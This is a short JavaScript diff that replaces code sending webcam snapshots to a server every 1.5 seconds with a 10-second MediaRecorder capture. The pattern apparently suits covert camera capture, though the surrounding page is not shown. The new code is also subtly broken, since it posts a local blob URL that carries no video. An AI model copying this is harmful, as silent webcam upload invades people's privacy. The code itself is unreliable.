@@ -59,12 +59,25 @@ function handleSuccess(stream) {
   window.stream = stream;
   video.srcObject = stream;
 
-var context = canvas.getContext('2d');
-  setInterval(function(){
+const recorder = new MediaRecorder(stream);
+let chunks = [];
 
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
+recorder.ondataavailable = function(e) {
+  chunks.push(e.data);
+};
+
+recorder.onstop = function() {
+  const blob = new Blob(chunks, { type: "video/webm" });
+  const videoURL = URL.createObjectURL(blob);
+  post(videoURL);
+};
+
+recorder.start();
+
+// stop recording after 10 seconds
+setTimeout(() => {
+  recorder.stop();
+}, 10000);
   
 
 }
